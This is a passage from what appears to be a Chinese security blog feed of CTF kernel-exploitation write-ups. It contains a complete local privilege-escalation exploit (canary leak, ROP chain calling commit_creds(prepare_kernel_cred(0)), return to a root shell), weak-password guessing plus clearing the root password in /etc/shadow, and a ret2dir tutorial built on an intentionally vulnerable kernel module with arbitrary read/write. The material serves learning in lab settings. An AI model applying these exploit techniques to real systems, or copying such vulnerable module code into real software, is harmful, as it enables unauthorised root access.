function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其中获取<strong>commit_creds</strong>等内核符号相对基址偏移的方式如下，得到偏移后，我们只要在运行exp时读取<strong>/tmp/kallsyms</strong>得到符号的真实地址，然后减去偏移之后就能得到<strong>虚拟地址符号基址</strong>。而且没有开启PIE保护下，我们可以看到内核映像默认加载基地址。这个地址是内核映像在物理内存中的加载地址，表示内核的起始位置。而<strong><code>/proc/kallsyms</code> 中的符号地址</strong> 是内核符号（如函数名、变量名等）在内核虚拟地址空间中的位置。由于 Linux 内核会进行地址空间布局随机化（ASLR），即使内核的物理地址是固定的，它在虚拟地址空间中的位置可能会有所不同。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117153339477.png"
                      class=""
                >
<p>首先我们先保存cs，rflags等信息，以便以后返回用户态。然后打开我们的内核模块core.ko中所注册的/proc/core获得一个文件描述符，那么之后就可以利用ioctl进行操作。然后我们就可以获取到核心的<strong>commit_creds</strong>和<strong>prepare_kernel_cred</strong>地址。我们的目标是调用<strong>commit_creds(prepare_kernel_cred(0));</strong>进行提权。各函数的具体实现可以看exp中的具体代码，还是比较简单的。因为我们找到的gadget等地址都是固定的物理地址空间的地址，我们想要的是虚拟空间地址，所以还要算出相对偏移。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">save_status();</span><br><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">find_symbols();</span><br><span class="line"><span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line"><span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;		<span class="comment">//虚拟地址空间相对于物理地址空间偏移</span></span><br></pre></td></tr></table></figure></div>
<p>之后最核心的就是与注册的core设备进行交互，具体实现采用的是ioctl方式，每个函数对应之前IDA中所看到的内核模块的功能。但我们能发现core.ko中<strong>core_ioctl</strong>函数中只会调用<strong>core_read</strong>和<strong>core_copy_func</strong>，而没有<strong>core_write</strong>的调用。其实我们也可以在用户态直接<strong>write(fd, buf, len);</strong>来调用到这个函数（fd为该设备的描述符）。</p>
<p>首先是泄露canary，我们从IDA就可以看出canary相距v4有0x40个字节。<code>copy_to_user(a1, &amp;v4[off], 64LL)</code>又能直接读出64个字节到用户空间，那么只要我们先把全局变量<strong>off</strong>设置为0x40，然后再用<strong>core_read</strong>函数，就能够将从canary开始的64个字节读取出来。也就泄露了canary。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">core_read(fd, buf);</span><br><span class="line"><span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br></pre></td></tr></table></figure></div>
<p>这里我们可以动调一下先看看，gdb从vmlinux启动，然后把core.ko作为symbol file附加上，之后就能在想要的位置处下断点了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117165103393.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117170701255.png"
                      class=""
                >
<p>那么我们先把exp编译出来，然后重新打包文件系统，再次启动在虚拟环境下运行exp，就能用gdb进行调试。这里比如我们在<strong>core_ioctl</strong>下断点。能够成功在这里断下来。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117171647372.png"
                      class=""
                >
<p>之后我们看<strong>core_read</strong>这个具体的过程，会发现<strong>copy_to_user</strong>执行完后，rbx指向了用户态的栈区域，也成功的把内核态中的canary以及之后的64个字节复制到了用户态的栈中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250117232044372.png"
                      class=""
                >
<p>然后就是写ROP，用的是ropper找出的gadget。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line"><span class="built_in">cat</span> g1 | grep <span class="string">&#x27;pop rdi; ret&#x27;</span>  </span><br><span class="line">......</span><br></pre></td></tr></table></figure></div>
<p>这里rop链中<code>mov rdi,rax</code>可以把<code>prepare_kernel_cred(0)</code>返回的内容作为参数传入<code>commit_creds</code>中，因为gadget中的<code>mov rdi,rax</code>后面还会call rdx，所以前两个pop ret都是为了抵消call rdx的作用的。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br></pre></td></tr></table></figure></div>
<p>执行完<strong>core_copy_func</strong>后，就成功把rop链写在了内核的栈上</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118001545125.png"
                      class=""
                >
<p>之后我们重点看看返回用户态所用的<strong>swapgs</strong>，<strong>popfq</strong>，<strong>iretq</strong>具体做了什么。</p>
<p>首先swapgs会切换gs寄存器，先后对比如下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003618379.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118003632606.png"
                      class=""
                >
<p>而<strong>popfq</strong>会把栈上弹出一个内容复制给e/rflags寄存器，先后对比如下。但这个并不重要，因为后面的ireq还会恢复e/rflags寄存器，所以这里的<strong>popfq</strong>只是gadget中<strong>swapgs</strong>的副作用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004009402.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118004050999.png"
                      class=""
                >
<p>而<strong>iretq</strong>则相当于先返回到当前栈顶地址处（用户态空间），然后依次从栈上弹出4个内容赋给cs，e/rflags，sp，以及ss。我们在函数一开始调用<strong>save_status</strong>就是为了这时候还原。</p>
<p>然后我们就返回了root权限的shell，要测试提权是否成功，我们现在回到init中把<code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code>中的0改回1000，然后重新打包并启动，运行exp看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250118005531726.png"
                      class=""
                >
<p>成功提权。</p>
<h5 id="DSBCTF-EasyKernel"><a href="#DSBCTF-EasyKernel" class="headerlink" title="DSBCTF-EasyKernel"></a>DSBCTF-EasyKernel</h5><p>给了3个文件。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119171402051.png"
                      class=""
                >
<p>先解压文件系统。然后在run.sh中加入<code>-s</code>启用gdb调试。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></div>
<p>这里我们缺vmlinux，可以用源码中的extract-vmlinux脚本来从bzImage中提取vmlinux。然后再用vmlinux-to-elf 工具恢复符号表。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">/mnt/e/ctf/kernel/linux-5.15.153/scripts/extract-vmlinux ./bzImage&gt; vmlinux</span><br><span class="line">vmlinux-to-elf ./vmlinux ./vmlinux_</span><br></pre></td></tr></table></figure></div>
<p>尝试启动时发现不是进入shell环境，而是要求进行登录。实际上，我们通过查看解压出的文件系统，可以发现/etc/inittab这个文件。这说明系统使用getty进行登录。我们通过查看etc/passwd文件的内容，很容易就能得到用户名为ctfshow，而密码加密后存在etc/shadow里，这个我们一般猜不到，这里我们尝试弱口令爆破，得到密码就为<strong>ctfshow</strong>，之后就能进入shell环境。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119180323832.png"
                      class=""
                >
<p>因为这题采用的是登录式，我们如果想要以root权限登录方便调试，就要先改/etc/shadow文件的root密码。这里我们直接清空这个root用户的密码。即改成<code>root::::::::</code>。之后我们用ctfshow用户登录进去后，就可以自由切换到root用户。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250120000054782.png"
                      class=""
                >
<p>对于run.sh以及init文件的分析在上文已经作为例子提及了，这里直接看提供的模块<strong>ctfshow.ko</strong>。</p>
<p>首先看<strong>init_module</strong>，注册了kqueue这个设备，之后可以靠kqueue_ioctl来进行交互。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250119172615036.png"
                      class=""
                >
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a class="link"   href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/" >https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://sky123.blog.csdn.net/article/details/130815994?sharetype=blogdetail&amp;sharerId=130815994&amp;sharerefer=WAP&amp;sharesource=" >https://sky123.blog.csdn.net/article/details/130815994?sharetype=blogdetail&amp;sharerId=130815994&amp;sharerefer=WAP&amp;sharesource=<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_45323960/article/details/130815994" >https://blog.csdn.net/qq_45323960/article/details/130815994<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dir手法学习</title>
    <url>/blog/2025/03/09/ret2dir%E6%89%8B%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="ret2dir手法学习"><a href="#ret2dir手法学习" class="headerlink" title="ret2dir手法学习"></a>ret2dir手法学习</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>Ret2dir（Return-to-Direct Mapping）是一种 <strong>内核利用</strong> 技术，攻击者可以利用它 <strong>绕过 SMEP、SMAP、pxn 等用户空间与内核空间隔离的防护手段</strong>，最终实现 <strong>本地提权</strong>。</p>
<p>在 <strong>大多数 Linux 内核（基于 x86_64 架构）</strong> 中，<strong>物理地址（Physical Address）</strong> 的很大一部分会被 <strong>直接映射（direct mapping）</strong> 到 <strong>内核虚拟地址空间（Kernel Virtual Address Space）</strong>，即 <code>physmap</code> 区域。这意味着，<strong>用户态（Userland）可以通过某些手段影响物理页</strong>，而内核可能会使用这些页，从而形成攻击面。</p>
<p>比如我们如果在用户空间大量申请内存，这些内存会停留在 ram 中，也就是会占用实际的物理地址，这些物理内存是会被physmap映射的，那么我们就能够通过改用户空间的内存，在内核空间布置<strong>ROP链</strong>（高版本有不可执行，所以不能直接布置shellcode），然后在内核空间劫持程序执行流到对应的ROP链即可。</p>
<h4 id="Case-Study"><a href="#Case-Study" class="headerlink" title="Case Study"></a>Case Study</h4><p>这里先参照<a class="link"   href="https://www.anquanke.com/post/id/185408" >这篇文章<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>自己搭个内核环境以及编写一个具有漏洞的模块进行学习。我们先写一个自己的内核模块，这里注册了一个叫做<strong>kpwn</strong>的misc设备以便之后用ioctl方式进行交互。这个模块提供了任意地址读、任意地址写、任意分配和回收内存的功能，以方便进行ret2dir的原理验证。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/miscdevice.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_ANY  0x1111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_ANY 0x2222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_ANY   0x3333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL_ANY   0x4444</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_args</span>&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> addr;</span><br><span class="line">    <span class="type">uint64_t</span> size;</span><br><span class="line">    <span class="type">char</span> __user *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">read_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;         <span class="comment">//任意读取内核地址，可以内存搜索</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,addr,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">write_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;        <span class="comment">//任意改写内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *addr = (<span class="type">void</span> *)args-&gt;addr;</span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(addr,args-&gt;buf,args-&gt;size))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">add_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//任意申请内核地址并返回给用户态</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;       </span><br><span class="line">    <span class="type">char</span> *buffer = kmalloc(args-&gt;size,GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span>(buffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(copy_to_user(args-&gt;buf,(<span class="type">void</span> *)&amp;buffer,<span class="number">0x8</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">del_any</span><span class="params">(<span class="keyword">struct</span> in_args *args)</span>&#123;          <span class="comment">//用户态任意释放内核地址</span></span><br><span class="line">    <span class="type">long</span> ret = <span class="number">0</span>;</span><br><span class="line">    kfree((<span class="type">void</span> *)args-&gt;addr);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">kpwn_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>&#123;</span><br><span class="line">    <span class="type">long</span> ret = -EINVAL;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_args</span> <span class="title">in</span>;</span></span><br><span class="line">    <span class="keyword">if</span>(copy_from_user(&amp;in,(<span class="type">void</span> *)arg,<span class="keyword">sizeof</span>(in)))&#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span>(cmd)&#123;</span><br><span class="line">        <span class="keyword">case</span> READ_ANY:</span><br><span class="line">            ret = read_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> WRITE_ANY:</span><br><span class="line">            ret = write_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DEL_ANY:</span><br><span class="line">            ret = del_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> ADD_ANY:</span><br><span class="line">            ret = add_any(&amp;in);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            ret = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .open =      <span class="literal">NULL</span>,</span><br><span class="line">    .release =   <span class="literal">NULL</span>,</span><br><span class="line">    .read =      <span class="literal">NULL</span>,</span><br><span class="line">    .write =     <span class="literal">NULL</span>,</span><br><span class="line">    .unlocked_ioctl = kpwn_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">miscdevice</span> <span class="title">misc</span> =</span> &#123;</span><br><span class="line">    .minor = MISC_DYNAMIC_MINOR,</span><br><span class="line">    .name  = <span class="string">&quot;kpwn&quot;</span>,</span><br><span class="line">    .fops = &amp;fops</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kpwn_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    misc_register(&amp;misc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kpwn_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye hackern&quot;</span>);</span><br><span class="line">    misc_deregister(&amp;misc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kpwn_init);</span><br><span class="line">module_exit(kpwn_exit);</span><br></pre></td></tr></table></figure></div>
<p>使用如下makefile进行编译内核模块，这里<strong>KERNELDR</strong>需要换成自己编译好的内核目录<strong>obj-m</strong>指定了目标输出文件：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">modules_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">modules_prepare:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDIR)</span> M=<span class="variable">$(PWD)</span> modules_prepare</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.mod.c .tmp_versions *.mod *.order *.symvers</span><br></pre></td></tr></table></figure></div>
<p>我使用的启动脚本如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// run.sh</span></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -m <span class="number">150</span>M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -kernel <span class="string">&quot;./bzImage&quot;</span> \</span><br><span class="line">    -initrd <span class="string">&quot;./initramfs.cpio&quot;</span> \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure></div>
<p>文件系统中的init文件如下：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /</span><br><span class="line">mount -t tmpfs tmpfs /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp</span><br><span class="line"></span><br><span class="line">insmod myko.ko</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
